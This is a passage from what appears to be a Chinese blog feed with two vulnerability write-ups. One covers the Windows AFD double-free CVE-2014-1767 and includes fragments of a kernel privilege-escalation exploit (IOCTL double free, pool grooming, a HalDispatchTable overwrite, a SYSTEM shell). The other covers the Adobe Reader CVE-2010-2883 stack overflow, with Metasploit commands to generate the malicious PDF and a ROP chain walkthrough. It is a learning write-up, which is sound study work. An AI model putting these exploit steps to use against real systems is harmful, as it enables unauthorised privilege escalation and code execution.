<h2 id="2-第一次调用分析（0x1207F）"><a href="#2-第一次调用分析（0x1207F）" class="headerlink" title="2. 第一次调用分析（0x1207F）"></a>2. 第一次调用分析（0x1207F）</h2><p>我们首先针对nt!NtDeviceIoControlFile设置条件断点，当其在处理0x1207F时断下，根据官方文档，该函数的第六个参数是IO控制码，也就是esp+18，因此条件断点为：</p>
<blockquote>
<p>bp nt!NtDeviceIoControlFile “.if (poi(esp+18) = 0x1207F){}.else{gc;}”</p>
</blockquote>
<p><img src="/2019/02/21/CVE-2014-1767/4.png" alt="4"></p>
<h3 id="1-AfdTransmitFile-函数分析"><a href="#1-AfdTransmitFile-函数分析" class="headerlink" title="1)AfdTransmitFile 函数分析"></a>1)AfdTransmitFile 函数分析</h3><p>断下来之后查看堆栈情况和调用情况:<br><img src="/2019/02/21/CVE-2014-1767/5.png" alt="5"></p>
<p>可以使用wt命令跟踪后续函数调用过程，可以发现，当 IoControlCode=0x1207F 时，afd 驱动会调用 afd!AfdTransmitFile 函数，我们直接对这个函数进行分析，这里我们直接用IDA反编译Afd中的AfdTransmitFile函数，因为该函数有两个参数(pIRP和pIoStackLocation)，我们将反编译的a1，a2改名为该参数，通过 IoStackLocation 我们就可以访问用户传递的数据了：<br><img src="/2019/02/21/CVE-2014-1767/6.png" alt="6"></p>
<p>通过分析，我们想要调用AfdTliGetTpInfo函数，必须满足这三个条件：</p>
<blockquote>
<p>(v54 &amp; 0xFFFFFFC8) ==0<br>(v54 &amp; 0x30) != 0x30<br>(v54 &amp; 0x30) != 0</p>
</blockquote>
<h3 id="2-AfdTliGetTpInfo-函数分析"><a href="#2-AfdTliGetTpInfo-函数分析" class="headerlink" title="2)AfdTliGetTpInfo 函数分析"></a>2)AfdTliGetTpInfo 函数分析</h3><p>满足上面条件之后，程序会调用AfdTliGetTpInfo函数，TpInfoElementCount是这个函数的参数，该函数的返回值是一个指向TpInfo结构体的指针，根据对AfdTransmitFile剩余函数部分的分析，该结构体大致如下：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TpInfo</span> </span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line">	......</span><br><span class="line">	TpInfoElement *pTpInfoElement ; <span class="comment">// +0x20, TpInfoElement数组指针 </span></span><br><span class="line">	......</span><br><span class="line">	ULONG TpInfoElementCount;       <span class="comment">// +0x28, TpInfoElement数组元素个数</span></span><br><span class="line">	......</span><br><span class="line">	ULONG AfdTransmitIoLength;      <span class="comment">// +0x38, 传输的默认IO长度 </span></span><br><span class="line">	......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TpInfoElement</span> &#123;</span> </span><br><span class="line">	<span class="keyword">int</span> status; 		    <span class="comment">// +0x00, 状态码</span></span><br><span class="line">	ULONG length ; 			<span class="comment">// +0x04, 长度 </span></span><br><span class="line">	PVOID VirtualAddress ; 	<span class="comment">// +0x08, 虚拟地址 </span></span><br><span class="line">	PVOID *pMdl ; 			<span class="comment">// +0x0C, 指向MDL内存描述符表的指针 </span></span><br><span class="line">	ULONG Reserved1 ; 		<span class="comment">// +0x10, 未知</span></span><br><span class="line">	ULONG Reserved2 ; 		<span class="comment">// +0x14, 未知</span></span><br><span class="line">&#125; ;</span><br></pre></td></tr></table></figure></p>
<p>用IDA反编译AfdTliGetTpInfo函数可以发现：<br><img src="/2019/02/21/CVE-2014-1767/7.png" alt="7"></p>
<p>以上就是函数 AfdTliGetTpInfo, 函数会根据参数从一个 Lookaside List 中申请 TpInfo 结构体，函数中调用的ExAllocateFromNPagedLookasideList函数含义大致如下：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">TpInfo* __<span class="function">stdcall <span class="title">ExAllocateFromNPagedLookasideList</span><span class="params">(PNPAGED_LOOKASIDE_LIST Lookaside)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">	*(Lookaside+<span class="number">0x0C</span>) ++ ; </span><br><span class="line">	tpInfo = InterlockedPopEntrySList( Lookaside ) </span><br><span class="line">	<span class="keyword">if</span>( tpInfo == <span class="literal">NULL</span>) </span><br><span class="line">	&#123; </span><br><span class="line">		*(Lookaside+<span class="number">0x10</span>)++; </span><br><span class="line">		tpInfo = AfdAllocateTpInfo(NonPagedPool,<span class="number">0x108</span> ,<span class="number">0xc6646641</span>) ;</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">return</span> tpInfo </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>AfdInitializeTpInfo 是一个初始化数据 tpInfo 的函数，我们直接分析赋值部分：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">AfdInitializeTpInfo(tpInfo, elemCount, stacksize, x)</span><br><span class="line">&#123;</span><br><span class="line">	……</span><br><span class="line">	tpInfo-&gt;pElemArray = tpInfo+<span class="number">0x90</span> </span><br><span class="line">	tpInfo-&gt;elemCount = <span class="number">0</span> </span><br><span class="line">	tpInfo-&gt;isOuterMem = <span class="literal">false</span></span><br><span class="line">	……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>根据上面的几个函数调用关系，我们可以大致分析的出来函数的调用顺序，经过以下调用，我们可以得到一个tpInfo结构体：</p>
<blockquote>
<p>ExAllocateFromNPagedLookasideList-&gt;AfdAllocateTpInfo-&gt;AfdInitializeTpInfo</p>
</blockquote>
<p>现在我们拿到结构体之后继续分析AfdTransmitFile函数剩余的一些部分:<br><img src="/2019/02/21/CVE-2014-1767/8.png" alt="8"></p>
<p>MmProbeAndLockPages函数锁定的无效地址是Poc中设置的值，因此触发异常，调用AfdReturnTpInfo函数:<br><img src="/2019/02/21/CVE-2014-1767/9.png" alt="9"></p>
<p>在AfdReturnTpInfo函数中，由于在释放MDL资源后，未对TpInfoElement+0xC指针清空，导致后面再次调用时将被IoFreeMdl函数用于释放内存，导致双重释放漏洞。<br><img src="/2019/02/21/CVE-2014-1767/10.png" alt="10"></p>
<h2 id="3-第二次调用分析（0x120C3）"><a href="#3-第二次调用分析（0x120C3）" class="headerlink" title="3. 第二次调用分析（0x120C3）"></a>3. 第二次调用分析（0x120C3）</h2><p>第二次追踪控制码，程序会调用afd!AfdTransmitPackets函数，我们继续下条件断点：</p>
<blockquote>
<p>bp nt!NtDeviceIoControlFile “.if (poi(esp+18) = 0x120C3){}.else{gc;}”</p>
</blockquote>
<p><img src="/2019/02/21/CVE-2014-1767/11.png" alt="11"></p>
<p>afd!AfdTransmitPackets函数仍然有两个参数pIRP和pIoStackLocation，我们用IDA反编译查看分析，需要满足以下三个条件实现AfdTdiGetTpInfo函数：<br><img src="/2019/02/21/CVE-2014-1767/12.png" alt="12"></p>
<p>Poc中设置inbuf2为0xAAAAAAA个TpInfoElement，一共占0x18*0xAAAAAAA = 0xFFFFFFF0，显然申请如此大内存会触发异常调用AfdReturnTpInfo函数<br><img src="/2019/02/21/CVE-2014-1767/13.png" alt="13"></p>
<p>继续运行，该函数再次调用时会触发漏洞，导致系统蓝屏<br><img src="/2019/02/21/CVE-2014-1767/14.png" alt="14"></p>
<h1 id="0x04：漏洞利用"><a href="#0x04：漏洞利用" class="headerlink" title="0x04：漏洞利用"></a>0x04：漏洞利用</h1><h2 id="1-思路"><a href="#1-思路" class="headerlink" title="1.思路"></a>1.思路</h2><p>思路是不可能有思路的，这里当然是选择参考分析大佬的思路：<br>[1]. 调用 DeviceIoControl， IoControlCode = 0x1207F, 造成一次 MDL free<br>[2]. 创建某个对象，使得这个对象恰好占据刚才被 free 掉的空间，至此转化 double-free 为 use-after-free 问题<br>[3]. 调用 DeviceIoControl, IoControlCode =0x120c3，走入重复释放流程，释放掉刚才新申请的对象<br>[4]. 覆盖被释放掉的对象为可控数据（伪造对象）<br>[5]. 尝试调用能够操作此对象的函数，让函数通过操作我们刚刚覆盖的可控数据，实现一个内核内存写操作，这个写操作最理想的就是“任意地址写任意内容”，这样我们就可以覆写 HalDispatchTable 的某个单元为我们 ShellCode 的地址，这样就可以劫持一个内核函数调用<br>[6]. 用户层触发刚刚被 Hook 的 HalDispatchTable 函数，使得内核执行 shellcode，达到提权的效果<br>简而言之，就是把double free玩成了UAF，实现一个内存的写，然后hook掉该函数</p>
<h2 id="2-对象的选择"><a href="#2-对象的选择" class="headerlink" title="2.对象的选择"></a>2.对象的选择</h2><p>由于对象的大小要等于第一次free的大小，并且这个对象应该有这样一个操作函数，这个函数能够操作我们的恶意数据，使得我们间接实现任意地址写任意内容。第一次释放的大小通过逆向 IoAllocateMdl可以看出，MDL 对象的大小是由 virtualAddress 和 length 共同决定的，具体大小是：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pages = ((Length &amp; <span class="number">0xFFF</span>) + (VirtualAddress &amp; <span class="number">0xFFF</span>) + <span class="number">0xFFF</span>)&gt;&gt;<span class="number">12</span> + (length&gt;&gt;<span class="number">12</span>) </span><br><span class="line">freedSize = mdlSize = pages*<span class="keyword">sizeof</span>(PVOID) + <span class="number">0x1C</span></span><br></pre></td></tr></table></figure></p>
<p>对于操作函数Siberas团队使用的是WorkerFactory函数，位置是反编译下图的exe，IDA中的函数是sub_468875<br><img src="/2019/02/21/CVE-2014-1767/15.png" alt="15"></p>
<p>我们找到关键的地方分析：<br><img src="/2019/02/21/CVE-2014-1767/16.png" alt="16"></p>
<p>可以看到，当参数满足一定条件（arg2 == 8 &amp;&amp; *arg3 !=0)时，我们可以达到一个任意地址写任意数据的目的：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">*(_DWORD *)(*(_DWORD *)(*(_DWORD *)Object + <span class="number">0x10</span>) + <span class="number">0x1C</span>) = v12;</span><br></pre></td></tr></table></figure></p>
<p>我们可以设置 :<br> <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">arg3 = ShellCode </span><br><span class="line">*(*object+<span class="number">0x10</span>)+<span class="number">0x1C</span> =(HalDispatchTable+<span class="number">0x4</span>)=HaliQuerySystemInformation</span><br></pre></td></tr></table></figure></p>
<p>这样就可以将shellcode地址写入HaliQuerySystemInformation，供后续shellcode执行。<br>我们分析知道被释放的 MDL 属于 NonPagedPool，而用户空间的 VirtualAlloc 并没有能 力为我们在 NonPagedPool 上分配空间从而让我们覆盖我们的数据！这就又要采取类似使用 NtSetInformationWorkerFactory 的方法，找那样一个 Nt*系列函数，它的内部操作 能够为我们完成一次 ExAllocatePool 并且是 NonPagedPool，并且还有能复制我们的数 据到它新申请的这个内存中去，说白了就是完成一次内核 Alloc 并且 memcpy 的操作，借助那篇 pdf 的思路，就是NtQueryEaFile 函数，下面是函数原型和关键的参数：<br><img src="/2019/02/21/CVE-2014-1767/17.png" alt="17"></p>
<p>我们还是用IDA反编译看一下内容：<br><img src="/2019/02/21/CVE-2014-1767/18.png" alt="18"></p>
<p><img src="/2019/02/21/CVE-2014-1767/19.png" alt="19"></p>
<p>就是说内部会调用 ：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">p = ExAllocatePoolWithQuotaTag(NonPagedPool, EaLength, <span class="number">0x20206F49</span>) </span><br><span class="line"><span class="built_in">memcpy</span>(p, EaList)</span><br></pre></td></tr></table></figure></p>
<p>其中 EaLength 与 EaList 都是输入参数，用户可控。当ExAllocatePoolWithQuotaTag再次调用ExAllocatePoolWithTag,其长度值会再加上4，即实际上ExAllocatePoolWithQuoTag分配的长度是EaLength+4，在对释放对象内存进行占用时，应该将对象大小objectsize – 4,才能成功占用。</p>
<h2 id="3-确定WorkerFactory对象的大小"><a href="#3-确定WorkerFactory对象的大小" class="headerlink" title="3. 确定WorkerFactory对象的大小"></a>3. 确定WorkerFactory对象的大小</h2><p>WorkerFactory占用空间的大小我们跟踪这条链：</p>
<blockquote>
<p>NtCreateWorkerFactory-&gt;ObpCreateObject-&gt;ObpAllocateObject-&gt; ExAllocatePoolWithTag</p>
</blockquote>
<p>我们发现申请的内存大小是0xA0字节</p>
<h2 id="4-exp的编写"><a href="#4-exp的编写" class="headerlink" title="4.exp的编写"></a>4.exp的编写</h2><p>这里借助会飞的猫大佬的exp，在VS2015，release版本下编译，提权成功，大佬的思路也非常清晰：<br>1)首先第一次释放前通过WorkerFactory对象的大小反推inbuf1的Length参数，并设置好inbuf2的值<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DWORD targetSize = <span class="number">0xA0</span>;</span><br><span class="line">	DWORD virtualAddress = <span class="number">0x13371337</span>;</span><br><span class="line">	DWORD Length = ((targetSize - <span class="number">0x1C</span>) / <span class="number">4</span> - (virtualAddress % <span class="number">4</span> ? <span class="number">1</span> : <span class="number">0</span>)) * <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">static</span> DWORD inbuf1[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">memset</span>(inbuf1, <span class="number">0</span>, <span class="keyword">sizeof</span>(inbuf1));</span><br><span class="line">	inbuf1[<span class="number">6</span>] = virtualAddress;</span><br><span class="line">	inbuf1[<span class="number">7</span>] = Length;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">static</span> DWORD inbuf2[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">memset</span>(inbuf2, <span class="number">0</span>, <span class="keyword">sizeof</span>(inbuf2));</span><br><span class="line">	inbuf2[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">	inbuf2[<span class="number">1</span>] = <span class="number">0x0AAAAAAA</span>;</span><br></pre></td></tr></table></figure></p>
<p>2)创建一个Workerfactory对象<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Create a Workerfactory object to occupy the free Mdl pool</span></span><br><span class="line">HANDLE hCompletionPort = CreateIoCompletionPort(INVALID_HANDLE_VALUE, <span class="literal">NULL</span>, <span class="number">1337</span>, <span class="number">4</span>);</span><br><span class="line">DWORD Exploit;</span><br><span class="line">status = NtCreateWorkerFactory(&amp;hWorkerFactory, GENERIC_ALL, <span class="literal">NULL</span>, hCompletionPort, (HANDLE)<span class="number">-1</span>, &amp;Exploit, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!NT_SUCCESS(status))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"NtCreateWorkerFactory fail!Error:%d\n"</span>, GetLastError());</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>3)第一次释放<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DeviceIoControl((HANDLE)s, <span class="number">0x1207F</span>, (LPVOID)inbuf1, <span class="number">0x30</span>, outBuf, <span class="number">0</span>, &amp;bytesRet, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure></p>
<p>4)第二次释放<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DeviceIoControl((HANDLE)s, <span class="number">0x120C3</span>, (LPVOID)inbuf2, <span class="number">0x18</span>, outBuf, <span class="number">0</span>, &amp;bytesRet, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure></p>
<p>5）伪造对象并拷贝shellcode执行<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">MyNtSetInformationWorkerFactory</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD* tem = (DWORD*)<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">	<span class="built_in">memset</span>(tem, <span class="string">'A'</span>, <span class="number">0x20</span>);</span><br><span class="line">	tem[<span class="number">0</span>] = (DWORD)shellcode;</span><br><span class="line"></span><br><span class="line">	NTSTATUS status = NtSetInformationWorkerFactory(hWorkerFactory, <span class="number">0x8</span>, tem, <span class="number">0x4</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>6）用户模式触发，系统权限调用cmd<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Trigger from user mode</span></span><br><span class="line">	ULONG temp = <span class="number">0</span>;</span><br><span class="line">	status = NtQueryIntervalProfile(<span class="number">2</span>, &amp;temp);</span><br><span class="line">	<span class="keyword">if</span> (!NT_SUCCESS(status))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"NtQueryIntervalProfile fail!Error:%d\n"</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"done!\n"</span>);</span><br><span class="line">	<span class="comment">//Sleep(000);</span></span><br><span class="line">	<span class="comment">//Create a new cmd process with current token</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Creating a new cmd...\n"</span>);</span><br><span class="line">	CreatNewCmd();</span><br></pre></td></tr></table></figure></p>
<h2 id="5-利用成功"><a href="#5-利用成功" class="headerlink" title="5.利用成功"></a>5.利用成功</h2><p><img src="/2019/02/21/CVE-2014-1767/漏洞利用.gif" alt="漏洞利用"></p>
<h1 id="0x05：补丁分析"><a href="#0x05：补丁分析" class="headerlink" title="0x05：补丁分析"></a>0x05：补丁分析</h1><p>在win10下，调用IoFreeMdl函数之前会对TpInfoElementCount的值进行一系列的判断从而避免该漏洞的产生<br><img src="/2019/02/21/CVE-2014-1767/20.png" alt="20"></p>
<h1 id="0x06：总结"><a href="#0x06：总结" class="headerlink" title="0x06：总结"></a>0x06：总结</h1><p>这个漏洞分析起来很麻烦，涉及的东西也很多，要有耐心才能分析的出来，从漏洞利用的思路，别人的exp编写来看，大牛确实厉害，自己的路还很长，希望自己有一天也能写出这样的exp来 。<br>参考资料：<br>[+] <a href="https://www.jianshu.com/p/6b01cfa41f0c" target="_blank" rel="noopener">https://www.jianshu.com/p/6b01cfa41f0c</a><br>[+] <a href="https://www.cnblogs.com/flycat-2016/p/5450275.html" target="_blank" rel="noopener">https://www.cnblogs.com/flycat-2016/p/5450275.html</a><br>[+] <a href="https://bbs.pediy.com/thread-194457.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-194457.htm</a></p>
]]></content>
      <categories>
        <category>CVE</category>
        <category>Windows Kernel</category>
        <category>Double Free</category>
      </categories>
      <tags>
        <tag>Double Free</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2010-2883</title>
    <url>/2019/02/21/CVE-2010-2883/</url>
    <content><![CDATA[<h1 id="0x00：前言"><a href="#0x00：前言" class="headerlink" title="0x00：前言"></a>0x00：前言</h1><p>记录一次漏洞调试的学习过程，实验环境的一些文件我已上传到GitHub上，欢迎下载，欢迎志同道合的朋友一起交流学习。</p>
<h1 id="0x01：实验环境"><a href="#0x01：实验环境" class="headerlink" title="0x01：实验环境"></a>0x01：实验环境</h1><ul>
<li>Windows XP SP3（虚拟机）</li>
<li>Adobe Reader 9.3.4（版本不能高于9.3.4）</li>
<li>IDA_Pro_v6.8_and_Hex-Rays_Decompiler_(ARM,x64,x86)_Green（静态分析）</li>
<li>PdfStreamDumper.exe（PDF二进制分析工具）</li>
<li>Ollydbg（动态调试）</li>
<li>msf.pdf（漏洞文件）</li>
</ul>
<p>漏洞文件的生成：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">	search cve-2010-2883</span><br><span class="line">	use exploit/windows/fileformat/adobe_cooltype_sing</span><br><span class="line">	set payload windows/exec</span><br><span class="line">    set cmd calc.exe</span><br><span class="line">    exploit</span><br></pre></td></tr></table></figure></p>
<p> Adobe Reader 9.3.4+PdfStreamDumper.exe+msf.pdf下载地址：<br> <a href="https://github.com/ThunderJie/CVE/tree/master/CVE-2010-2883" target="_blank" rel="noopener">https://github.com/ThunderJie/CVE/tree/master/CVE-2010-2883</a></p>
<h1 id="0x02：涉及知识点"><a href="#0x02：涉及知识点" class="headerlink" title="0x02：涉及知识点"></a>0x02：涉及知识点</h1><ul>
<li>Stack Overflow（栈溢出）</li>
<li>Heap Spray（堆喷射）</li>
<li>文件偏移计算</li>
<li>OD动态调试</li>
<li>IDA静态分析等</li>
</ul>
<h1 id="0x03：漏洞分析"><a href="#0x03：漏洞分析" class="headerlink" title="0x03：漏洞分析"></a>0x03：漏洞分析</h1><p>1.IDA静态分析CoolType.dll找到漏洞点<br><img src="/2019/02/21/CVE-2010-2883/1.png" alt="1"></p>
<p>搜索字符串“SING”找到溢出点，可以看到这里strcat()函数之前未对uniqueName长度进行检测就复制，造成溢出搜索字符串“SING”找到溢出点，可以看到这里strcat()函数之前未对uniqueName长度进行检测就复制，造成溢出<br><img src="/2019/02/21/CVE-2010-2883/2.png" alt="2"></p>
<p>2.PDFStreamDumper分析文件偏移<br>TTF(TrueTypeFont)是Apple公司和Microsoft公司共同推出的字体文件格式,随着windows的流行,已经变成最常用的一种字体文件表示方式，官方文档对TTF中SING表的TableEntry定义如下：<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> sturct_SING</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> tag[<span class="number">4</span>];   <span class="comment">//"SING"</span></span><br><span class="line">    ULONG checkSum;<span class="comment">//校验和</span></span><br><span class="line">    ULONG offset;  <span class="comment">//相对文件偏移</span></span><br><span class="line">    ULONG length;  <span class="comment">//数据长度</span></span><br><span class="line">&#125; TableEntry;</span><br></pre></td></tr></table></figure></p>
<p>我们通过PDFStreamDumper导入漏洞文件，找到TableEntry<br><img src="/2019/02/21/CVE-2010-2883/3.png" alt="3"></p>
<p>从TableEntry结构入口偏移0x11c即为SING表真实数据，也就是从00 00 01 00开始的部分<br><img src="/2019/02/21/CVE-2010-2883/4.png" alt="4"></p>
<p>又根据SING表的数据结构，再偏移0x10即为uniqueName域，如下图:<br><img src="/2019/02/21/CVE-2010-2883/5.png" alt="5"></p>
<p>strcat函数执行后，将00 00 00 3A之后的数据复制到ebp指定地址直到下图的NULL为止<br><img src="/2019/02/21/CVE-2010-2883/6.png" alt="6"></p>
<p>3.OD进行动态调试<br>打开Adobe Reader 用OD附加此程序，F9运行，crtl+g设置断点在0x803DD9F处，Adobe Reader中打开msf.pdf自动中断在0x803DD89F处<br><img src="/2019/02/21/CVE-2010-2883/7.png" alt="7"></p>
<p>运行一步将数据窗口的值跟随EAX的值，对比PDFStreamDumper的值，这段汇编将已经在内存里的uniqueName域copy至程序所运行的栈中<br><img src="/2019/02/21/CVE-2010-2883/8.png" alt="8"></p>
<p>选中所有的shelloce，在上面下内存访问断点，F9运行，开始寻找执行shellcode的代码。<br><img src="/2019/02/21/CVE-2010-2883/9.png" alt="9"></p>
<p>F9运行第一次断在这里，取出了一个byte比较，没有到关键点，继续运行<br><img src="/2019/02/21/CVE-2010-2883/10.png" alt="10"></p>
<p>继续运行有很多比较的地方，运行到这里是循环取出4byte的数据，但是还没有到关键点，继续运行<br><img src="/2019/02/21/CVE-2010-2883/11.png" alt="11"></p>
<p>一直运行到这里，终于到关键点了，这里有一个调用虚表的指令，一开始虚表是存在栈上的，但是被我们溢出覆盖成了恶意地址<br><img src="/2019/02/21/CVE-2010-2883/12.png" alt="12"></p>
<p>软件因为自带DEP保护，需要用到Heap Spray技术和构造ROP链来绕过，ROP的地址选取的是0x4a82a714和0x4a80cb38两处地址，因为在Adobe Reader各个版本中这个dll上的这两个地址不会改变，如下图<br><img src="/2019/02/21/CVE-2010-2883/13.png" alt="13"></p>
<p><img src="/2019/02/21/CVE-2010-2883/14.png" alt="14"></p>
<p>继续运行可以看到调用在icucnv36.dll中的内容<br><img src="/2019/02/21/CVE-2010-2883/15.png" alt="15"></p>
<p>运行分析第一处ROP<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pop esp</span><br><span class="line">retn</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/02/21/CVE-2010-2883/16.png" alt="16"></p>
<p>查看堆栈情况变化<br><img src="/2019/02/21/CVE-2010-2883/17.png" alt="17"></p>
<p>继续运行来到第二处ROP<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pop ecx</span><br><span class="line">retn</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/02/21/CVE-2010-2883/18.png" alt="18"></p>
<p>时刻关注堆栈情况<br><img src="/2019/02/21/CVE-2010-2883/19.png" alt="19"></p>
<p>继续运行来到第三处ROP<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov dword ptr ds:[ecx],eax</span><br><span class="line">retn</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/02/21/CVE-2010-2883/20.png" alt="20"></p>
<p>时刻关注堆栈情况<br><img src="/2019/02/21/CVE-2010-2883/21.png" alt="21"></p>
<p>运行来到第四次ROP，这里保存了CreateFileA函数地址<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pop eax</span><br><span class="line">retn</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/02/21/CVE-2010-2883/22.png" alt="22"></p>
<p>时刻关注堆栈情况<br><img src="/2019/02/21/CVE-2010-2883/23.png" alt="23"></p>
<p>继续运行，这里跳转到函数地址准备调用函数<br><img src="/2019/02/21/CVE-2010-2883/24.png" alt="24"></p>
<p>这里打开或创建了iso88591文件<br><img src="/2019/02/21/CVE-2010-2883/25.png" alt="25"></p>
<p>继续运行了几次之后发现后面的rop链是为了调用这三个函数，CreateFileMappingA（）函数实现创建文件内存映射，后面两个函数作用是将shellcode拷贝到内存可执行段，实现方法和前面很相似，就不放那么多照片了。<br><img src="/2019/02/21/CVE-2010-2883/26.png" alt="26"></p>
<p><img src="/2019/02/21/CVE-2010-2883/27.png" alt="27"></p>
<p>继续运行到这里可以看到正在执行shellcode部分<br><img src="/2019/02/21/CVE-2010-2883/28.png" alt="28"></p>
<p>运行到了这里终于要到了调用计算器的地方<br><img src="/2019/02/21/CVE-2010-2883/29.png" alt="29"></p>
<p>最终调用到计算器，完成测试<br><img src="/2019/02/21/CVE-2010-2883/30.png" alt="30"></p>
<h1 id="0x04：总结"><a href="#0x04：总结" class="headerlink" title="0x04：总结"></a>0x04：总结</h1><p>第一次记录关于调试CVE漏洞的文章，实践起来确实加深了对漏洞的理解，虽然原理只是运用了一个栈溢出，可是实践起来却涉及了许许多多的技术，以前做过一些ctf中pwn的题目对栈溢出漏洞原理比较熟悉，可能有些地方没有说清楚，如果有不懂的地方欢迎交流。</p>
<p>参考资料：<br>《漏洞战争 软件漏洞分析精要》<br><a href="https://blog.csdn.net/qq_31481187/article/details/74093072" target="_blank" rel="noopener">https://blog.csdn.net/qq_31481187/article/details/74093072</a><br><a href="https://blog.csdn.net/andy7002/article/details/74276469?utm_source=blogxgwz9" target="_blank" rel="noopener">https://blog.csdn.net/andy7002/article/details/74276469?utm_source=blogxgwz9</a></p>
]]></content>
      <categories>
        <category>CVE</category>
        <category>Stack Overflow</category>
      </categories>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
</search>
